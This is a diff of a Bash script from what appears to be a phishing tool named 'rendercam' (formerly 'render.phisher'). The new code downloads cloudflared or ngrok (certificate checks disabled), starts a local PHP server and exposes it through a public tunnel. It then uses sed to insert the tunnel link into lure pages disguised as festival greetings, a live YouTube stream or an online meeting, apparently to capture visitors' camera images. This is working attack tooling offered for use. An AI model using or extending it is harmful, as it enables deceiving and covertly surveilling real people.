@@ -105,6 +105,37 @@ banner_small() {
         EOF
 }
 
+## Kill Processes
+stop() {
+if [[ "$windows_mode" == true ]]; then
+  # Windows-specific process termination
+  taskkill /F /IM "ngrok.exe" 2>/dev/null
+  taskkill /F /IM "php.exe" 2>/dev/null
+  taskkill /F /IM "cloudflared.exe" 2>/dev/null
+else
+  # Unix-like systems
+  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+  checkphp=$(ps aux | grep -o "php" | head -n1)
+  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)
+
+  if [[ $checkngrok == *'ngrok'* ]]; then
+    pkill -f -2 ngrok > /dev/null 2>&1
+    killall -2 ngrok > /dev/null 2>&1
+  fi
+
+  if [[ $checkphp == *'php'* ]]; then
+    killall -2 php > /dev/null 2>&1
+  fi
+
+  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
+    pkill -f -2 cloudflared > /dev/null 2>&1
+    killall -2 cloudflared > /dev/null 2>&1
+  fi
+fi
+
+exit 1
+}
+
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
@@ -150,18 +181,18 @@ trap exit_on_signal_SIGTERM SIGTERM
 
 ## Kill already running process
 kill_pid() {
-        check_PID="php cloudflared loclx"
-        for process in ${check_PID}; do
-                if [[ $(pidof ${process}) ]]; then # Check for Process
-                        killall ${process} > /dev/null 2>&1 # Kill the Process
-                fi
-        done
+    check_PID="php cloudflared loclx"
+    for process in ${check_PID}; do
+    	if [[ $(pidof ${process}) ]]; then # Check for Process
+        	killall ${process} > /dev/null 2>&1 # Kill the Process
+        fi
+    done
 }
 
 # Check for new update
 check_update() {
-  local release_url='https://api.github.com/repos/render437/render.phisher/releases/latest'
-  local ua='render-phisher-updater/1.0 (+https://example.com)'
+  local release_url='https://api.github.com/repos/render437/rendercam/releases/latest'
+  local ua='rendercam-updater/1.0 (+https://example.com)'
   local tmpfile new_version tarball_url
 
   # Prerequisites check
@@ -192,7 +223,7 @@ check_update() {
     return 1
   fi
 
-  tarball_url="https://github.com/render437/render.phisher/archive/refs/tags/${new_version}.tar.gz"
+  tarball_url="https://github.com/render437/rendercam/archive/refs/tags/${new_version}.tar.gz"
 
   # --- Compare versions ---
   if [[ "$new_version" != "$__version__" ]]; then
@@ -431,7 +462,7 @@ about() {
                         msg_exit;;
                 0 | 00)
                         echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
-                        { sleep 1; rendercam; };;
+                        { sleep 1; main_menu; };;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; about; };;
@@ -537,136 +568,288 @@ sleep 0.5
 done 
 }
 
-## Start Cloudflared
-start_cloudflared() { 
-        rm .cld.log > /dev/null 2>&1 &
-        cusport
-        echo -e "\n${ORANGE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-        { sleep 1; setup_site; }
-        echo -ne "\n\n${CYAN} Waiting for Cloudflare response..."
+cloudflare_tunnel() {
+if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
 
-        if [[ `command -v termux-chroot` ]]; then
-                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-        else
-                sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-        fi
+# Detect architecture
+arch=$(uname -m)
+os=$(uname -s)
+printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"
 
-        sleep 8
-        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-        custom_url "$cldflr_url"
-        capture_data
-}
-
-localxpose_auth() {
-        ./.server/loclx -help > /dev/null 2>&1 &
-        sleep 1
-        [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-        [ "$(./.server/loclx account status | grep Error)" ] && {
-                echo -e "\n\n${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
-                sleep 3
-                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token:${ORANGE} " loclx_token
-                [[ $loclx_token == "" ]] && {
-                        echo -e "\n${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-                } || {
-                        echo -n "$loclx_token" > $auth_f 2> /dev/null
-                }
-        }
-}
-
-## Start LocalXpose
-start_loclx() {
-        cusport
-        echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-        { sleep 1; setup_site; localxpose_auth; }
-        echo -e "\n"
-        read -n1 -p "${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-        [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-        echo -e "\n\n${GREEN} Launching LocalXpose..."
-
-        if [[ `command -v termux-chroot` ]]; then
-                sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-        else
-                sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-        fi
-
-        sleep 12
-        loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-        custom_url "$loclx_url"
-        capture_data
-}
-
-## Start localhost
-start_localhost() {
-    cusport
-    echo -e "\n${BRIGHT_GREEN} Initializing... ${BRIGHT_GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-    setup_site
-    { sleep 1; clear; banner_small; }
-    echo -e "\n${BRIGHT_GREEN} Successfully Hosted at: ${BRIGHT_GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-    capture_data
-}
-
-## Start ngrok
-ngrok_auth() {
-    ./.server/ngrok authtoken -help > /dev/null 2>&1 &
-    sleep 1
-
-    auth_f="$HOME/.ngrok2/ngrok.yml"
-
-    # Check if ngrok is configured (authtoken exists in config file)
-    if ! grep -q "authtoken:" "$auth_f"; then
-        echo -e "\n\n${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
-        sleep 3
-        read -p "${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
-        [[ $ngrok_token == "" ]] && {
-            echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
-        } || {
-            # Create .ngrok2 directory if it doesn't exist
-            mkdir -p "$HOME/.ngrok2"
-
-            # Write the authtoken to the ngrok.yml file
-            echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
-            echo -e "\n${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
-        }
-    fi
-}
-
-
-start_ngrok() {
-    cusport #Assuming this sets $HOST and $PORT
-    ngrok_auth # Ensure authtoken is configured
-
-    echo -e "\n${ORANGE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-
-    echo -ne "\n\n${CYAN} Starting Ngrok tunnel..."
-
-    if [[ `command -v termux-chroot` ]]; then
-    sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
+# Windows detection
+if [[ "$windows_mode" == true ]]; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
+    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
+    if [[ -e cloudflared.exe ]]; then
+        chmod +x cloudflared.exe
+        # Create a wrapper script to run the exe
+        echo '#!/bin/bash' > cloudflared
+        echo './cloudflared.exe "$@"' >> cloudflared
+        chmod +x cloudflared
     else
-		sleep 2 && ./.server/ngrok tcp $PORT &
+        printf "\e[1;93m[!] Download error... \e[0m\n"
+        exit 1
     fi
-
-
-    sleep 5 #Give ngrok time to start
-
-    #Find the ngrok URL (you may need to adjust the grep if the output format changes)
-    ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-
-
-    if [[ -z "$ngrok_url" ]]; then
-    	echo -e "\n${RED} Failed to retrieve Ngrok URL, check following possible reasons ${RED}"
-        echo -e "\n${GREEN} CloudFlare tunnel service might be down ${GREEN}"
-        echo -e "\n${GREEN} If you are using android, turn hotspot on ${GREEN}"
-        echo -e "\n${GREEN} CloudFlared is already running, run this command killall cloudflared ${GREEN}"
-        echo -e "\n${GREEN} Check your internet connection ${GREEN}"
-        echo -e "\n${GREEN} Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors ${GREEN}"
-        echo -e "\n${GREEN} On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1 ${GREEN}"
-
+else
+    # Non-Windows systems
+    # macOS detection
+    if [[ "$os" == "Darwin" ]]; then
+        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
+        if [[ "$arch" == "arm64" ]]; then
+            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
+            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
+        else
+            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
+            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
+        fi
+        
+        if [[ -e cloudflared.tgz ]]; then
+            tar -xzf cloudflared.tgz > /dev/null 2>&1
+            chmod +x cloudflared
+            rm cloudflared.tgz
+        else
+            printf "\e[1;93m[!] Download error... \e[0m\n"
+            exit 1
+        fi
+    # Linux and other Unix-like systems
     else
-        custom_url "$ngrok_url"
-        capture_data
+        case "$arch" in
+            "x86_64")
+                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
+                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
+                ;;
+            "i686"|"i386")
+                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
+                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
+                ;;
+            "aarch64"|"arm64")
+                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
+                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
+                ;;
+            "armv7l"|"armv6l"|"arm")
+                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
+                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
+                ;;
+            *)
+                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
+                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
+                ;;
+        esac
+        
+        if [[ -e cloudflared ]]; then
+            chmod +x cloudflared
+        else
+            printf "\e[1;93m[!] Download error... \e[0m\n"
+            exit 1
+        fi
     fi
+fi
+fi
 
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
+rm -rf .cloudflared.log > /dev/null 2>&1 &
+
+if [[ "$windows_mode" == true ]]; then
+    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+else
+    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+fi
+
+sleep 10
+link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+if [[ -z "$link" ]]; then
+printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
+exit 1
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+fi
+payload_cloudflare
+checkfound
+}
+
+payload_cloudflare() {
+link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+fi
+rm -rf index3.html
+}
+
+ngrok_server() {
+if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+
+# Detect architecture
+arch=$(uname -m)
+os=$(uname -s)
+printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"
+
+# Windows detection
+if [[ "$windows_mode" == true ]]; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
+    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
+    if [[ -e ngrok.zip ]]; then
+        unzip ngrok.zip > /dev/null 2>&1
+        chmod +x ngrok.exe
+        rm -rf ngrok.zip
+    else
+        printf "\e[1;93m[!] Download error... \e[0m\n"
+        exit 1
+    fi
+else
+    # macOS detection
+    if [[ "$os" == "Darwin" ]]; then
+        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
+        if [[ "$arch" == "arm64" ]]; then
+            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
+            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
+        else
+            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
+            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
+        fi
+        
+        if [[ -e ngrok.zip ]]; then
+            unzip ngrok.zip > /dev/null 2>&1
+            chmod +x ngrok
+            rm -rf ngrok.zip
+        else
+            printf "\e[1;93m[!] Download error... \e[0m\n"
+            exit 1
+        fi
+    # Linux and other Unix-like systems
+    else
+        case "$arch" in
+            "x86_64")
+                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
+                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
+                ;;
+            "i686"|"i386")
+                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
+                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
+                ;;
+            "aarch64"|"arm64")
+                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
+                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
+                ;;
+            "armv7l"|"armv6l"|"arm")
+                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
+                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
+                ;;
+            *)
+                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
+                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
+                ;;
+        esac
+        
+        if [[ -e ngrok.zip ]]; then
+            unzip ngrok.zip > /dev/null 2>&1
+            chmod +x ngrok
+            rm -rf ngrok.zip
+        else
+            printf "\e[1;93m[!] Download error... \e[0m\n"
+            exit 1
+        fi
+    fi
+fi
+fi
+
+# Ngrok auth token handling
+if [[ "$windows_mode" == true ]]; then
+    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
+        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
+        cat "$USERPROFILE\.ngrok2\ngrok.yml"
+        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
+            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+        fi
+    else
+        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
+    fi
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    sleep 2
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+    ./ngrok.exe http 3333 > /dev/null 2>&1 &
+else
+    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
+        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
+        cat  ~/.ngrok2/ngrok.yml
+        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+        fi
+    else
+        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+    fi
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    sleep 2
+    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+    ./ngrok http 3333 > /dev/null 2>&1 &
+fi
+
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+if [[ -z "$link" ]]; then
+printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
+exit 1
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+fi
+payload_ngrok
+checkfound
+}
+
+payload_ngrok() {
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+fi
+rm -rf index3.html
 }
 
 
@@ -687,11 +870,11 @@ tunnel_menu() {
 			echo -ne "\n${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
 		1 | 01)
-			start_localhost;;
+			cloudflare_tunnel;;
 		2 | 02)
-			start_ngrok;;
+			ngrok_server;;
 		3 | 03)
-			start_cloudflared;;
+			cloudflare_tunnel;;
 		*)
 			echo -ne "\n${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
